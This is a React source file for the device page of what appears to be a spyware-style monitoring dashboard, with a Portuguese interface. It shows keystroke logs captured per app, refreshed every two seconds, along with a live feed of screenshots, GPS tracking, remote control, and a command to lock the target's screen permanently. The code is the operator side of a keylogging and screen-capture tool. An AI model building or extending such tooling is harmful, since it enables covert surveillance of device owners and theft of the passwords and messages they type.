import { useMemo, useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import LockedScreen from "@/components/LockedScreen";
import PhoneFrame from "@/components/PhoneFrame";
import { trpc } from "@/lib/trpc";

interface DeviceDetailsProps {
  deviceId: string;
  deviceName: string;
  onBack: () => void;
}

export default function DeviceDetails({
  deviceId,
  deviceName,
  onBack,
}: DeviceDetailsProps) {
  const utils = trpc.useUtils();
  const numericDeviceId = Number(deviceId);
  const [activeTab, setActiveTab] = useState("info");
  const [isLiveActive, setIsLiveActive] = useState(true);
  const [isControlActive, setIsControlActive] = useState(false);
  const [isScreenLocked, setIsScreenLocked] = useState(false);
  const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());

  const devicesQuery = trpc.device.list.useQuery(undefined, {
    refetchInterval: 10000,
  });
  const screenshotsQuery = trpc.corporate.screenshots.list.useQuery(
    { deviceId: numericDeviceId, limit: 24 },
    {
      enabled: Number.isFinite(numericDeviceId),
      refetchInterval: isLiveActive ? 3000 : false,
      refetchOnWindowFocus: true,
    }
  );

  const device = useMemo(
    () => devicesQuery.data?.find((item) => item.id === numericDeviceId),
    [devicesQuery.data, numericDeviceId]
  );

  const screenshots = screenshotsQuery.data ?? [];
  const latestScreenshot = screenshots[0] ?? null;
  const lastSeenLabel = device?.lastSeen
    ? new Date(device.lastSeen).toLocaleString("pt-BR")
    : "Indisponivel";
  const liveStatusLabel = latestScreenshot
    ? `Ultima captura em ${new Date(latestScreenshot.createdAt).toLocaleTimeString("pt-BR")}`
    : "Aguardando primeira captura do dispositivo";

  // Fetch keylogs from backend
  const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
    { deviceId },
    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
  );

  // Fetch deleted keylogs from backend
  const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
    { deviceId }
  );

  // Mutations
  const deleteKeylogMutation = trpc.keylogs.delete.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
      setSelectedKeylogs(new Set());
    },
  });

  const restoreKeylogMutation = trpc.keylogs.restore.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
    },
  });

  const removeDeviceMutation = trpc.device.remove.useMutation({
    onSuccess: async () => {
      await utils.device.list.invalidate();
      await screenshotsQuery.refetch();
      onBack();
    },
  });

  const handleScreenshot = () => {
    screenshotsQuery.refetch();
  };

  const handleStopLive = () => {
    setIsLiveActive(false);
    alert("⏹️ Visualização ao vivo parada");
  };

  const handleActivateControl = () => {
    setIsControlActive(!isControlActive);
    alert(
      isControlActive
        ? "🎮 Controle desativado"
        : "🎮 Controle remoto ativado"
    );
  };

  const handleLockScreen = () => {
    setIsScreenLocked(true);
    alert("🔒 Tela travada! Digite a senha para destravar.");
  };

  const handleUnlockScreen = () => {
    setIsScreenLocked(false);
    alert("🔓 Tela desbloqueada com sucesso!");
  };

  const handleRemoveDevice = () => {
    if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
      removeDeviceMutation.mutate({ deviceId: numericDeviceId });
    }
  };

  const handleToggleKeylogSelection = (id: number) => {
    const newSelected = new Set(selectedKeylogs);
    if (newSelected.has(id)) {
      newSelected.delete(id);
    } else {
      newSelected.add(id);
    }
    setSelectedKeylogs(newSelected);
  };

  const handleRemoveSelectedKeylogs = () => {
    if (selectedKeylogs.size === 0) {
      alert("Selecione pelo menos um keylog para remover");
      return;
    }
    selectedKeylogs.forEach((id) => {
      deleteKeylogMutation.mutate({ keylogId: id });
    });
  };

  const handleRemoveAllKeylogs = () => {
    if (confirm("Tem certeza que deseja remover TODOS os keylogs?")) {
      keylogs.forEach((keylog) => {
        deleteKeylogMutation.mutate({ keylogId: keylog.id });
      });
    }
  };

  const handleRestoreKeylog = (id: number) => {
    restoreKeylogMutation.mutate({ keylogId: id });
  };

  // Format timestamp to readable time
  const formatTime = (date: Date | string) => {
    const d = new Date(date);
    return d.toLocaleTimeString("pt-BR");
  };

  if (isScreenLocked) {
    return <LockedScreen deviceName={deviceName} onUnlock={handleUnlockScreen} />;
  }

  return (
    <div className="space-y-6 pb-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <Button
          onClick={onBack}
          variant="outline"
          className="text-cyan-400 border-cyan-600 hover:bg-cyan-900"
        >
          ← Voltar
        </Button>
        <h1 className="text-3xl font-bold text-cyan-400">
          {deviceName}
        </h1>
      </div>

      {/* Action Buttons */}
      <div className="flex flex-wrap gap-3">
        <Button
          onClick={handleScreenshot}
          className="bg-cyan-500 hover:bg-cyan-600 text-white"
        >
          📸 Capturar Screenshot
        </Button>
        <Button
          onClick={handleStopLive}
          className="bg-red-600 hover:bg-red-700 text-white"
        >
          ⏹️ Parar Ao Vivo
        </Button>
        <Button
          onClick={handleActivateControl}
          className="bg-blue-600 hover:bg-blue-700 text-white"
        >
          🎮 Ativar Controle
        </Button>
        <Button
          onClick={handleLockScreen}
          className="bg-orange-600 hover:bg-orange-700 text-white"
        >
          🚫 Travar Tela
        </Button>
        <Button
          onClick={handleRemoveDevice}
          disabled={removeDeviceMutation.isPending}
          className="bg-red-700 hover:bg-red-800 text-white"
        >
          {removeDeviceMutation.isPending ? "Removendo..." : "🗑️ Remover Dispositivo"}
        </Button>
      </div>

      {/* Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
        <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
          <TabsTrigger
            value="info"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ℹ️ Informações
          </TabsTrigger>
          <TabsTrigger
            value="commands"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⚙️ Comandos
          </TabsTrigger>
          <TabsTrigger
            value="screenshots"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📸 Screenshots
          </TabsTrigger>
          <TabsTrigger
            value="keylogs"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⌨️ Keylogs
          </TabsTrigger>
          <TabsTrigger
            value="history"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📜 Histórico
          </TabsTrigger>
        </TabsList>

        {/* Aba: Informações */}
        <TabsContent value="info" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📋 Informações Básicas</h3>
              <div className="space-y-3 text-slate-300">
                <div>
                  <p className="text-slate-400 text-sm">Nome do Dispositivo</p>
                  <p className="font-semibold">{deviceName}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Modelo</p>
                  <p className="font-semibold">{device?.deviceType || "Android"}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Status</p>
                  <p className="font-semibold">
                    {device?.status === "online" ? "Online" : "Offline"}
                  </p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Ultimo contato</p>
                  <p className="font-semibold">{lastSeenLabel}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Localização</p>
                  <p className="font-semibold">{device?.location || "Indisponivel"}</p>
                </div>
              </div>
            </Card>

            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📊 Status do Sistema</h3>
              <div className="space-y-3">
                <div>
                  <div className="flex justify-between mb-1">
                    <p className="text-slate-400 text-sm">Capturas recebidas</p>
                    <p className="text-cyan-400 font-semibold">{screenshots.length}</p>
                  </div>
                  <div className="w-full bg-slate-700 rounded-full h-2">
                    <div
                      className="bg-cyan-500 h-2 rounded-full"
                      style={{ width: `${Math.min(screenshots.length, 24) / 24 * 100}%` }}
                    ></div>
                  </div>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Feed atual</p>
                  <p className="text-cyan-400 font-semibold">{liveStatusLabel}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Atualização automática</p>
                  <p className="text-cyan-400 font-semibold">
                    {isLiveActive ? "Ligada a cada 3 segundos" : "Pausada"}
                  </p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Último Acesso</p>
                  <p className="text-cyan-400 font-semibold">{lastSeenLabel}</p>
                </div>
              </div>
            </Card>
          </div>
        </TabsContent>

        {/* Aba: Comandos */}
        <TabsContent value="commands" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              { icon: "📸", title: "Tirar Screenshot", desc: "Capturar tela do dispositivo" },
              { icon: "🔊", title: "Ativar Som", desc: "Reproduzir som no dispositivo" },
              { icon: "🔒", title: "Bloquear Dispositivo", desc: "Bloquear a tela do dispositivo" },
              { icon: "🚫", title: "Travar Tela", desc: "Travar a tela permanentemente" },
              { icon: "📍", title: "Rastrear Localização", desc: "Obter localização GPS em tempo real" },
              { icon: "🔄", title: "Sincronizar", desc: "Sincronizar dados do dispositivo" },
            ].map((cmd, idx) => (
              <Card key={idx} className="bg-slate-800 border-slate-700 p-4 hover:border-cyan-500 transition">
                <div className="flex items-start justify-between">
                  <div>
                    <p className="text-2xl mb-2">{cmd.icon}</p>
                    <h4 className="text-cyan-400 font-bold">{cmd.title}</h4>
                    <p className="text-slate-400 text-sm mt-1">{cmd.desc}</p>
                  </div>
                </div>
                <Button className="w-full mt-3 bg-cyan-600 hover:bg-cyan-700">
                  Executar
                </Button>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Aba: Screenshots */}
        <TabsContent value="screenshots" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">
              📸 Screenshots Capturados ({screenshots.length})
            </h3>
            {screenshotsQuery.isLoading ? (
              <p className="text-slate-400 text-center py-8">Carregando screenshots...</p>
            ) : screenshots.length === 0 ? (
              <p className="text-slate-400 text-center py-8">
                Nenhuma captura real recebida ainda para este dispositivo.
              </p>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
                {screenshots.map((screenshot) => (
                  <a
                    key={screenshot.id}
                    href={screenshot.screenshotUrl ?? screenshot.imageUrl ?? "#"}
                    target="_blank"
                    rel="noreferrer"
                    className="block overflow-hidden rounded-lg border border-slate-600 bg-slate-900 hover:border-cyan-500 transition"
                  >
                    <img
                      src={screenshot.screenshotUrl ?? screenshot.imageUrl ?? ""}
                      alt={`Screenshot de ${deviceName}`}
                      className="aspect-video w-full object-cover"
                    />
                    <div className="p-3 text-sm text-slate-300">
                      <p>{new Date(screenshot.createdAt).toLocaleString("pt-BR")}</p>
                      <p className="text-cyan-400">{screenshot.captureType}</p>
                    </div>
                  </a>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* Aba: Keylogs */}
        <TabsContent value="keylogs" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-cyan-400 font-bold">⌨️ Keylogs Capturados ({keylogs.length})</h3>
              <div className="flex gap-2">
                <Button
                  onClick={handleRemoveSelectedKeylogs}
                  disabled={selectedKeylogs.size === 0}
                  className="bg-red-600 hover:bg-red-700 text-white disabled:opacity-50"
                >
                  🗑️ Remover Selecionados ({selectedKeylogs.size})
                </Button>
                <Button
                  onClick={handleRemoveAllKeylogs}
                  className="bg-red-700 hover:bg-red-800 text-white"
                >
                  ⚠️ Remover Todos
                </Button>
              </div>
            </div>

            {keylogsLoading ? (
              <p className="text-slate-400 text-center py-8">Carregando keylogs...</p>
            ) : keylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog capturado</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {keylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
                  >
                    <input
                      type="checkbox"
                      checked={selectedKeylogs.has(log.id)}
                      onChange={() => handleToggleKeylogSelection(log.id)}
                      className="w-4 h-4 cursor-pointer"
                    />
                    <div className="flex-1">
                      <p className="text-slate-300">
                        <span className="text-cyan-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* Aba: Histórico */}
        <TabsContent value="history" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">📜 Histórico de Keylogs Removidos ({deletedKeylogs.length})</h3>
            {deletedKeylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog no histórico</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {deletedKeylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex justify-between items-center p-3 bg-slate-700 rounded border border-slate-600 hover:border-yellow-500 transition"
                  >
                    <div>
                      <p className="text-slate-300">
                        <span className="text-yellow-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                    <Button
                      onClick={() => handleRestoreKeylog(log.id)}
                      className="bg-green-600 hover:bg-green-700 text-white text-sm"
                    >
                      ↩️ Restaurar
                    </Button>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>
      </Tabs>

      {/* Visualização ao Vivo */}
      {isLiveActive && (
        <div className="mt-8">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <div className="mb-4 flex items-center justify-between gap-3">
              <div>
                <h3 className="text-cyan-400 font-bold">🔴 Visualização Ao Vivo</h3>
                <p className="text-sm text-slate-400">
                  Feed real baseado nas ultimas capturas recebidas do dispositivo.
                </p>
              </div>
              <span
                className={`rounded-full px-3 py-1 text-xs font-bold ${
                  device?.status === "online"
                    ? "bg-green-900/30 text-green-300"
                    : "bg-red-900/30 text-red-300"
                }`}
              >
                {device?.status === "online" ? "Online" : "Offline"}
              </span>
            </div>
            <div className="flex justify-center py-8">
              <PhoneFrame status={liveStatusLabel}>
                {screenshotsQuery.isLoading ? (
                  <div className="flex h-full items-center justify-center text-slate-400">
                    Carregando tela...
                  </div>
                ) : latestScreenshot ? (
                  <img
                    src={latestScreenshot.screenshotUrl ?? latestScreenshot.imageUrl ?? ""}
                    alt={`Tela atual de ${deviceName}`}
                    className="h-full w-full object-contain bg-black"
                  />
                ) : (
                  <div className="px-6 text-center text-slate-400">
                    <p className="text-sm">Nenhuma captura real disponivel ainda.</p>
                    <p className="mt-2 text-xs text-slate-500">
                      Assim que o dispositivo enviar screenshots, a tela aparece aqui automaticamente.
                    </p>
                  </div>
                )}
              </PhoneFrame>
            </div>
          </Card>
        </div>
      )}
    </div>
  );
}
